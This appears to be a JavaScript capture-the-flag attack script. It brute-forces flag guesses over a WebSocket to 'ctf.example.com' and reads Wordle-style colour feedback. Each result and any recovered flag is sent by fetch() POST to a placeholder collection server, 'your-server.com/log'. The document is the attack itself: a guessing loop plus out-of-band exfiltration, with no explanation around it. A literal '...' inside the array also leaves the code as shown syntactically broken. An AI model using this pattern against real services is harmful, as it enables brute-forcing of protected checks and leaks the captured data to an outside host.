// Replace with your server URL to receive results
const YOUR_SERVER = 'https://your-server.com/log';

// List of possible words (from the words.txt or common flags)
// If the flag is not in words.txt, you might need to brute-force flag formats like "flag{...}"
const words = [
    "flag{test_flag}",
    "flag{example_flag}",
    ... // Add more words or flags here
];

let currentIndex = 0;

// Open WebSocket to the CTF server
const ws = new WebSocket('wss://ctf.example.com/ws');

ws.onopen = function() {
    console.log('Connected to WebSocket');
    // Start sending guesses
    sendNextGuess();
};

ws.onmessage = function(event) {
    const results = JSON.parse(event.data);
    console.log('Results for', words[currentIndex-1], ':', results);

    // Send results to your server
    fetch(YOUR_SERVER, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ guess: words[currentIndex-1], results: results })
    });

    // Check if all are green
    if (results.every(color => color === 'green')) {
        console.log('Flag found:', words[currentIndex-1]);
        // Send the flag to your server
        fetch(YOUR_SERVER, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ flag: words[currentIndex-1] })
        });
    } else {
        // Send next guess
        setTimeout(sendNextGuess, 100); // Delay to avoid flooding
    }
};

function sendNextGuess() {
    if (currentIndex < words.length) {
        ws.send(JSON.stringify({ answer: words[currentIndex] }));
        currentIndex++;
    } else {
        console.log('No more words to try');
    }
}
